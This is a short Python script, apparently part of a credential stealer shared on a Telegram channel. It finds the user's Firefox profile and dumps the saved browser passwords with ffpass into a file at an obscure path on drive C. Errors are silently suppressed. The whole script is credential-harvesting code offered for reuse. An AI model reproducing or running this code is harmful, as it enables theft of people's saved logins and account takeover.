################################################################################
#                              RIGHT DECISION                                  #
#                     Telegram https://t.me/+fN7NR-nVvmsxYWRi                  #
#      Если сливаете мой скрипт в свой канал. Хотя бы отметьте мой канал       #
################################################################################
import os
import configparser
import subprocess
import ffpass

def Firefox():
    try:
        mozilla_profile = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
        mozilla_profile_ini = os.path.join(mozilla_profile, r'profiles.ini')
        profile = configparser.ConfigParser()
        profile.read(mozilla_profile_ini)
        data_path = os.path.normpath(os.path.join(mozilla_profile, profile.get('Profile0', 'Path')))
        subprocesss = subprocess.Popen("ffpass export -d  " + data_path, shell=True, stdout=subprocess.PIPE)
        subprocess_return = subprocesss.stdout.read()
        passwords = str(subprocess_return)
        with open(r'C:\hesoyam8927163\Firefox\f1.txt', "a", encoding="utf-8") as file:
            file.write(passwords.replace('\\r', '\n'))
            file.close()
    except:
        pass
